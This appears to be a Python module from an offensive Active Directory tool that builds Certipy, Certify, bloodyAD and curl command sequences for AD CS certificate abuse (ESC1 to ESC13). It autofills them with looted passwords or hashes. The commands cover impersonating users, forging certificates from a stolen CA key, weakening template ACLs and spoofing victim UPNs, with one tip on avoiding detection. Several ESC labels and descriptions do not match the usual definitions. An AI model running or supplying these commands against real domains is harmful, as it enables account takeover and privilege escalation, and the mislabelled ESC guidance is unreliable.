from __future__ import annotations

from typing import Any, Dict, List, Tuple
from engine.commands import CommandProvider
from engine import state as est
import logging

log = logging.getLogger("nanohound.commands.pki")


@CommandProvider.register("pki")
def generate(
    source: Dict[str, Any],
    target: Dict[str, Any],
    domain: str,
    creds: Dict[str, Any] | None = None,
    network_context: Dict[str, Any] | None = None,
) -> List[Tuple[str, str]]:
    """PKI/ADCS command generator preserving Certipy/AD CS multi-step flows.

    Signature: `generate(source, target, domain, creds, network_context)`
    Returns list of (title, command) tuples. Tries legacy oracle first,
    otherwise emits Certipy/Certify-style guidance and preserves vulnerable
    template warnings and CA/template heuristics.
    """
    creds = creds or {}
    lm = est.loot_manager
    edge = creds.get("edge") or creds.get("edge_type") or ""
    src = source or {}
    tgt = target or {}

    # Legacy monolith removed; use modular provider heuristics only

    # Helpers
    def _template_vulnerable(tnode: Dict[str, Any]) -> bool:
        try:
            if not hasattr(est, "graph_engine") or not est.graph_engine:
                return False
            node_id = tnode.get("id") or tnode.get("name")
            if not node_id:
                return False
            # Use node utils to fetch attributes when possible
            node_obj = type("N", (), {"id": node_id})
            attrs = CommandProvider.utils.node.get_node_attrs(est.graph_engine, node_obj) or {}
            raw = attrs.get("raw_properties") or {}
            sd = raw.get("ntSecurityDescriptor") or raw.get("securityDescriptor") or raw.get("acl") or ""
            if isinstance(sd, str) and ("Authenticated Users" in sd or "Everyone" in sd):
                return True
            for key in ("enrollment", "enroll", "allowenrollment", "msPKI-Enrollment-Flag"):
                val = raw.get(key) or attrs.get(key)
                if val:
                    text = str(val).lower()
                    if "true" in text or "all" in text or "everyone" in text:
                        return True
        except Exception:
            pass
        return False

    domain = domain or src.get("domain") or tgt.get("domain") or "<DOMAIN>"
    username = src.get("name") or "<SOURCE_USER>"
    ca_name = tgt.get("name") or "<ENTERPRISE_CA>"
    ca_server = tgt.get("dc") or tgt.get("ca_server") or "<CA_SERVER>"
    dc_ip = "<DC_IP>"
    try:
        dc_guess = CommandProvider.utils.network.find_dc_for_domain(domain, prefer_ip=True)
        if dc_guess:
            dc_ip = dc_guess
    except Exception:
        pass

    # Autofill credential material
    source_password = "<PASSWORD>"
    try:
        if lm:
            cred = lm.get_credential(src.get("id")) or lm.get_credential(src.get("name"))
            if cred:
                source_password = str(getattr(cred, "password", "") or getattr(cred, "ntlm_hash", "") or source_password)
            else:
                allc = lm.all_credentials()
                if allc:
                    first = allc[0]
                    source_password = str(first.get("password") or first.get("ntlm_hash") or source_password)
    except Exception:
        pass

    results: List[Tuple[str, str]] = []

    # ESC-specific quick snippets (preserve multi-step guidance)
    if edge and str(edge).upper().startswith("ESC"):
        esc = str(edge).upper()
        auth_flags = ""
        try:
            auth_flags = CommandProvider.utils.node.auth_flags(lm, src) if lm else ""
        except Exception:
            try:
                auth_flags = lm.build_auth_flags(src.get("id") or src.get("name")) if hasattr(lm, "build_auth_flags") else ""
            except Exception:
                auth_flags = ""
        auth_part = f" {auth_flags}" if auth_flags else ""

        if esc == "ESC1":
            results.append((
                "ESC1 - Enroll via vulnerable template",
                (
                    f"# ESC1: Use a vulnerable template to enroll a cert for a target principal\n"
                    f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -vulnerable\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <VULNERABLE_TEMPLATE>\n"
                    "# Then extract private key from PFX and use for auth or S4U flows"
                ),
            ))

        if esc == "ESC3":
            results.append((
                "ESC3 - Enrollment Agent OBO",
                (
                    f"# ESC3: Enrollment Agent / On-Behalf-Of (OBO) flow\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <ENROLLMENT_AGENT_TEMPLATE>\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <ON_BEHALF_TEMPLATE> -on-behalf-of <TARGET_PRINCIPAL> -pfx <AGENT>.pfx\n"
                    "certipy-ad auth -pfx <IMPERSONATED>.pfx -dc-ip <DC_IP>\n"
                ),
            ))

        if esc == "ESC4":
            results.append((
                "ESC4 - Modify template",
                (
                    "# ESC4: Modify an existing CertTemplate to weaken issuance constraints\n"
                    f"certipy-ad template -username {username}@{domain} -password {source_password} -template '<TEMPLATE_NAME>' -save-configuration '<TEMPLATE_BACKUP>.json'\n"
                    "# Edit the JSON to remove constraints then re-apply via certipy-ad template -apply -file '<TEMPLATE_BACKUP>.json'\n"
                ),
            ))

        if esc == "ESC6":
            results.append((
                "ESC6 - CA management",
                (
                    "# ESC6: CA management can grant issuance rights or enable templates\n"
                    f"certipy-ad ca -ca '{ca_name}' -add-officer <CONTROLLED_PRINCIPAL> -username {username}@{domain} -password '{source_password}'\n"
                    f"certipy-ad ca -ca '{ca_name}' -enable-template <TEMPLATE_CN> -username {username}@{domain} -password '{source_password}'\n"
                ),
            ))

        if esc == "ESC13":
            results.append((
                "ESC13 - OID Group Link",
                (
                    "# ESC13: Add OID -> Group link to map certificate OID into group membership claims.\n"
                    f"bloodyAD --host {dc_ip} -d {domain} -u {username}{auth_part} set object '<ISSUANCE_POLICY_DN>' msDS-OIDToGroupLink -v '<GROUP_DN>'\n"
                ),
            ))

        if esc == "ESC6B":
            # ADCS ESC6b: CA allows arbitrary SAN and target DC allows weak mapping
            try:
                tgt_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, tgt)
                target_pfx = getattr(tgt_cred, "pfx_path", "") or "<TARGET>.pfx"
            except Exception:
                target_pfx = "<TARGET>.pfx"
            results.append((
                "ESC6b - CA arbitrary SAN / weak mapping",
                (
                    "# ESC6b: CA allows arbitrary SAN and target DC allows weak mapping\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
                    f"-target {ca_server} -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                    "# Authenticate as target with weak cert mapping on affected DC\n"
                    f"certipy-ad auth -pfx {target_pfx} -dc-ip {dc_ip}"
                ),
            ))

        if esc == "ESC7":
            # GoldenCert / CA private key compromise alternatives (ESC7-style)
            try:
                tgt_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, tgt)
                forged_pfx = getattr(tgt_cred, "pfx_path", "") or "<FORGED_CERT>.pfx"
            except Exception:
                forged_pfx = "<FORGED_CERT>.pfx"
            results.append((
                "ESC7 - GoldenCert / CA private key",
                (
                    "# GoldenCert: CA private key compromise enables forging auth certificates for any enabled principal in the AD forest\n"
                    f"# Source CA host: {src.get('name') or '<ENTERPRISE_CA_HOST>'}  Target domain: {domain}\n"
                    "# If the CA private key is HSM/TPM-protected, direct export may fail; validate ESC7-style alternatives\n"
                    "# 1) Back up the CA certificate/private key from the CA host\n"
                    f"certipy-ad ca -backup -config '{ca_server}\\{ca_name}' -username {username}@{domain} -password '{source_password}' -target {src.get('name') or '<CA_HOST>'}\n"
                    "# 2) Forge a certificate for the target principal\n"
                    f"certipy-ad forge -ca-pfx <CA_BACKUP>.pfx -upn <TARGET_USER>@{domain}\n"
                    "# 3) Authenticate as forged principal\n"
                    f"certipy-ad auth -pfx {forged_pfx} -dc-ip {dc_ip}"
                ),
            ))

        if esc == "ESC9A" or esc == "ESC9":
            # ADCS ESC9a: weak mapping + no security extension + controlled victim UPN
            victim = src.get('name') or "<VICTIM_PRINCIPAL>"
            try:
                src_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, src)
                victim_password = getattr(src_cred, 'password', '') or getattr(src_cred, 'ntlm_hash', '') or "<VICTIM_PASSWORD>"
            except Exception:
                victim_password = "<VICTIM_PASSWORD>"
            try:
                tgt_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, tgt)
                target_pfx = getattr(tgt_cred, 'pfx_path', '') or "<TARGET>.pfx"
            except Exception:
                target_pfx = "<TARGET>.pfx"
            results.append((
                "ESC9a - Weak mapping via victim UPN",
                (
                    "# ADCS ESC9a: weak mapping + no security extension + controlled victim UPN\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                    f"-user {victim} -upn <TARGET_SAMACCOUNTNAME>\n"
                    "# Enroll cert as victim\n"
                    f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
                    f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                    "# Restore victim UPN and authenticate as target on weak-mapping DC\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                    f"-user {victim} -upn <ORIGINAL_UPN>\n"
                    f"certipy-ad auth -pfx {target_pfx} -dc-ip {dc_ip}"
                ),
            ))

        if esc == "ESC9B":
            # ADCS ESC9b: weak mapping + no security extension + controlled victim dNSHostName
            victim = src.get('name') or "<VICTIM_COMPUTER>$"
            try:
                src_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, src)
                victim_password = getattr(src_cred, 'password', '') or getattr(src_cred, 'ntlm_hash', '') or "<VICTIM_PASSWORD>"
            except Exception:
                victim_password = "<VICTIM_PASSWORD>"
            try:
                tgt_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, tgt)
                target_pfx = getattr(tgt_cred, 'pfx_path', '') or "<TARGET_HOST>.pfx"
            except Exception:
                target_pfx = "<TARGET_HOST>.pfx"
            results.append((
                "ESC9b - Weak mapping via victim dNSHostName",
                (
                    "# ADCS ESC9b: weak mapping + no security extension + controlled victim dNSHostName\n"
                    "# 1) Remove conflicting SPNs for victim if needed\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                    f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                    "# 2) Enroll cert as victim computer\n"
                    f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
                    f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                    "# 3) (Optional) restore victim dNSHostName/SPN, then authenticate as target computer\n"
                    f"certipy-ad auth -pfx {target_pfx} -dc-ip {dc_ip}"
                ),
            ))

        if esc == "ESC10A" or esc == "ESC10":
            # ADCS ESC10a: UPN mapping abuse via controlled victim principal
            victim = src.get('name') or "<VICTIM_PRINCIPAL>"
            try:
                src_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, src)
                victim_password = getattr(src_cred, 'password', '') or getattr(src_cred, 'ntlm_hash', '') or "<VICTIM_PASSWORD>"
            except Exception:
                victim_password = "<VICTIM_PASSWORD>"
            try:
                tgt_cred = CommandProvider.utils.node.get_credential_record(lm, est.graph_engine, tgt)
                target_pfx = getattr(tgt_cred, 'pfx_path', '') or "<TARGET>.pfx"
            except Exception:
                target_pfx = "<TARGET>.pfx"
            results.append((
                "ESC10a - UPN mapping abuse",
                (
                    "# ADCS ESC10a: UPN mapping abuse via controlled victim principal\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                    f"-user {victim} -upn <TARGET_SAM>@{domain}\n"
                    "# Enroll certificate as victim on affected template/CA\n"
                    f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
                    f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                    "# Restore victim UPN and authenticate with issued cert\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} -user {victim} -upn <ORIGINAL_UPN>\n"
                    f"certipy-ad auth -pfx {target_pfx} -dc-ip {dc_ip} -ldap-shell"
                ),
            ))

        if esc == "ESC10B":
            # ADCS ESC10b: dNSHostName mapping abuse via controlled computer
            victim = src.get('name') or "<VICTIM_COMPUTER>$"
            victim_password = (lm.get_credential(src.get('id')) and (getattr(lm.get_credential(src.get('id')), 'password', '') or getattr(lm.get_credential(src.get('id')), 'ntlm_hash', ''))) or "<VICTIM_PASSWORD>"
            target_pfx = lm.get_credential(tgt.get('id')) and getattr(lm.get_credential(tgt.get('id')), 'pfx_path', '') or "<TARGET_HOST>.pfx"
            results.append((
                "ESC10b - dNSHostName mapping abuse",
                (
                    "# ADCS ESC10b: dNSHostName mapping abuse via controlled computer\n"
                    "# 1) Remove conflicting SPNs on victim if needed\n"
                    "# 2) Set victim dNSHostName to target computer FQDN\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                    f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                    "# 3) Enroll cert as victim computer\n"
                    f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
                    f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                    "# 4) Authenticate as mapped target computer\n"
                    f"certipy-ad auth -pfx {target_pfx} -dc-ip {dc_ip} -ldap-shell"
                ),
            ))

        # Explicit educated/verbatim templates for ESC flows that lacked a legacy verbatim block
        if esc == "ESC2":
            results.append((
                "ESC2 - Enroll with controlled SAN/UPN (template misconfiguration)",
                (
                    "# ESC2: Enroll a certificate using a template that allows SAN/UPN control or weak subject constraints\n"
                    "# 1) Enumerate CA + template details and confirm SAN/UPN issuance support:\n"
                    f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -template {tgt.get('name') or '<TEMPLATE>'}\n"
                    "# 2) If template permits SAN/UPN, request a cert with a controlled UPN/SAN for the target principal:\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template {tgt.get('name') or '<TEMPLATE>'} -subject 'CN=<REQUESTER>' -san 'upn:<TARGET_UPN>' -pfx <OUT>.pfx\n"
                    "# 3) Export and use the PFX to authenticate (LDAP/SMB/Kerberos PKINIT depending on mapping):\n"
                    f"certipy-ad auth -pfx <OUT>.pfx -dc-ip {dc_ip}\n"
                    "# Notes: Validate whether the target DC maps certificate UPNs to AD accounts (UPN mapping) or allows computer-name mapping for dNSHostName."
                ),
            ))

        if esc == "ESC5":
            results.append((
                "ESC5 - Template publish / ACL abuse to enable broad enrollment",
                (
                    "# ESC5: Abuse template publishing or DACLs to enable wide enrollment (Authenticated Users / Everyone)\n"
                    "# 1) Enumerate current template ACLs and CA published templates:\n"
                    f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -vulnerable\n"
                    "# 2) If you have CA/template privileges, export the template config, add a permissive ACE, and re-apply:\n"
                    f"certipy-ad template -username {username}@{domain} -password '{source_password}' -template '{tgt.get('name') or '<TEMPLATE>'}' -backup '<TEMPLATE>.json'\n"
                    "# Edit '<TEMPLATE>.json' -> add 'Authenticated Users' with Enroll permissions to the ACL section\n"
                    f"certipy-ad template -apply -file '<TEMPLATE>.json' -username {username}@{domain} -password '{source_password}'\n"
                    "# 3) Once published/permissive, enroll a cert and use it for authentication:\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template {tgt.get('name') or '<TEMPLATE>'} -pfx <OUT>.pfx\n"
                    f"certipy-ad auth -pfx <OUT>.pfx -dc-ip {dc_ip}\n"
                    "# Notes: Reverting ACL changes is recommended after verification; watch CA event logs for suspicious template changes."
                ),
            ))

        if esc == "ESC8":
            results.append((
                "ESC8 - RA/SCEP or web enrollment abuse (request submission paths)",
                (
                    "# ESC8: Abuse RA/SCEP/web enrollment or alternate request submission endpoints to obtain certs\n"
                    "# 1) Enumerate ACME/RA/SCEP endpoints and CA web enrollment settings (if available):\n"
                    f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -vulnerable\n"
                    "# 2) Submit a crafted certificate request via RA/web endpoint with desired SAN/UPN attributes:\n"
                    f"curl -k -u \"{username}@{domain}:{source_password}\" \"https://{ca_server}/certsrv/certfnsh.asp\" --data 'Mode=newreq&CertRequest=<BASE64_REQ>&CertAttrib=CertificateTemplate:{tgt.get('name') or '<TEMPLATE>'}'\n"
                    "# 3) Retrieve issued cert, export to PFX, and authenticate as mapped principal:\n"
                    f"certipy-ad auth -pfx <OUT>.pfx -dc-ip {dc_ip}\n"
                    "# Notes: Web enrollment may accept attributes that the AD-only interface restricts; logging and RA approvals vary by deployment."
                ),
            ))

        if esc == "ESC11":
            results.append((
                "ESC11 - UPN/SAN mapping with temporary account manipulation",
                (
                    "# ESC11: Temporarily manipulate UPN/dNS mapping or controlled account attributes to obtain a cert mapped to a high-value principal\n"
                    "# 1) Identify a controllable account (user or computer) and the target mapping requirement (UPN or dNSHostName):\n"
                    f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -vulnerable\n"
                    "# 2) Update the controllable account's UPN or dNSHostName to match the target principal, enroll, then restore:\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} -user <CONTROLLED> -upn <TARGET_UPN>\n"
                    f"certipy-ad req -u <CONTROLLED>@{domain} -p <CONTROLLED_PASS> -ca {ca_name} -target {ca_server} -template {tgt.get('name') or '<TEMPLATE>'} -pfx <OUT>.pfx\n"
                    "# 3) Restore original attributes and authenticate as target using the issued cert on weak-mapping DCs:\n"
                    f"certipy-ad account update -u {username}@{domain} -p {source_password} -user <CONTROLLED> -upn <ORIGINAL_UPN>\n"
                    f"certipy-ad auth -pfx <OUT>.pfx -dc-ip {dc_ip}\n"
                    "# Notes: Carefully restore attributes to avoid detection; target mapping behavior depends on DC certificate-to-account mapping policies."
                ),
            ))

        if esc == "ESC12":
            results.append((
                "ESC12 - Certificate -> Group mapping (OID / attribute abuse)",
                (
                    "# ESC12: Abuse certificate issuance OIDs or certificate->group mapping to escalate into groups/roles\n"
                    "# 1) Enumerate AD claims mappings and group-OID links on the CA and domain controllers:\n"
                    f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -vulnerable\n"
                    "# 2) If an OID->Group mapping exists or can be created, request a cert containing the OID or extension that maps to the desired group:\n"
                    f"# Example: request a cert with custom OID extension (replace <OID> and value encoding as needed)\n"
                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template {tgt.get('name') or '<TEMPLATE>'} -ext '1.2.3.4=<VALUE>' -pfx <OUT>.pfx\n"
                    "# 3) Authenticate or trigger claims evaluation to effect group membership via the mapped OID/extension.\n"
                    f"certipy-ad auth -pfx <OUT>.pfx -dc-ip {dc_ip}\n"
                    "# Notes: OID->Group mappings are environment-specific; canonical exploitation requires validating CA/AD claim link configuration."
                ),
            ))

        # Keep legacy oracle attempt for any remaining unknown alias names
        try:
            import importlib.util
            from pathlib import Path

            legacy_path = Path(__file__).parent.parent / "commands.py"
            spec = importlib.util.spec_from_file_location("nanohound.commands_legacy", str(legacy_path))
            if spec and spec.loader:
                legacy = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(legacy)  # type: ignore
                if hasattr(legacy, "CommandOracle"):
                    legacy_oracle = legacy.CommandOracle(est.loot_manager, est.graph_engine)
                    out = legacy_oracle.get_exploit_command(esc, src, tgt)
                    if out:
                        return [(f"Suggested (legacy {esc})", out)]
        except Exception:
            log.debug("legacy lookup failed for %s", esc)

        if tgt.get("node_type") == "certtemplate" and _template_vulnerable(tgt):
            results.insert(0, ("Vulnerable template detected", "# WARNING: This template appears to be vulnerable/open for enrollment. Verify template ACLs and issuance constraints before proceeding."))

        return results

    # Generic ADCS guidance -- preserved multi-step strings
    guidance = (
        f"# ADCS / PKI guidance for edge {edge or '<ESC>'}\n"
        f"# Domain: {domain}  CA: {ca_name}  CA server: {ca_server}\n\n"
        "# 1) Discover CA and template configuration\n"
        f"certipy-ad find -u {username}@{domain} -p {source_password} -dc-ip {dc_ip} -vulnerable\n"
        "powershell -c \"Get-CertificateTemplate | fl *\"\n\n"
        "# 2) Request a cert from a published template (Enroll)\n"
        f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <PUBLISHED_TEMPLATE>\n"
        "Certify.exe request --ca {ca_server}\\{ca_name} --template <PUBLISHED_TEMPLATE>\n\n"
        "# 3) Enrollment agent / On-behalf-of flows (ESC3 style)\n"
        "# Enroll an enrollment agent cert, then request on-behalf-of another principal\n"
        f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <ENROLLMENT_AGENT_TEMPLATE>\n"
        f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <ON_BEHALF_TEMPLATE> -on-behalf-of <TARGET_PRINCIPAL> -pfx <AGENT>.pfx\n"
        "# Then authenticate with the issued pfx: certipy-ad auth -pfx <IMPERSONATED>.pfx -dc-ip <DC_IP>\n\n"
        "# 4) CA administration / template editing (ManageCA / ManageCertificates)\n"
        f"certipy-ad ca -ca '{ca_name}' -add-officer <CONTROLLED_PRINCIPAL> -username {username}@{domain} -password '{source_password}'\n"
        f"certipy-ad ca -ca '{ca_name}' -enable-template <TEMPLATE_CN> -username {username}@{domain} -password '{source_password}'\n\n"
        "# 5) Helper: retrieve issued requests or pending requests\n"
        f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -retrieve <REQUEST_ID>\n"
    )

    results.append(("ADCS / PKI guidance", guidance))

    if tgt.get("node_type") == "certtemplate" or "template" in (tgt.get("type") or "").lower():
        enroll_on_behalf = (
            "# EnrollOnBehalfOf multi-step (ESC3 hint)\n"
            f"# 1) Enroll Enrollment Agent cert from source template\n"
            f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template {tgt.get('name') or '<ENROLLMENT_AGENT_TEMPLATE>'}\n"
            "# 2) Use agent cert to request target template on-behalf-of another principal\n"
            f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template <ON_BEHALF_TEMPLATE> -on-behalf-of <DOMAIN\\TARGET_USER> -pfx <AGENT>.pfx\n"
            "# 3) Authenticate with issued cert: certipy-ad auth -pfx <IMPERSONATED>.pfx -dc-ip <DC_IP>\n"
        )
        results.append(("EnrollOnBehalfOf (ESC3)", enroll_on_behalf))

    if tgt.get("node_type") in ("enterpriseca", "ca", "certificationauthority") or "ca" in (tgt.get("type") or "").lower():
        ca_ops = (
            f"# CA administration examples for {ca_name}\n"
            f"certipy-ad ca -ca '{ca_name}' -add-officer <CONTROLLED_PRINCIPAL> -username {username}@{domain} -password '{source_password}'\n"
            f"certipy-ad ca -ca '{ca_name}' -enable-template <TEMPLATE_CN> -username {username}@{domain} -password '{source_password}'\n"
            "# Use these carefully; they require CA privileges and may need service restarts.\n"
        )
        results.append(("CA admin examples", ca_ops))

    return results
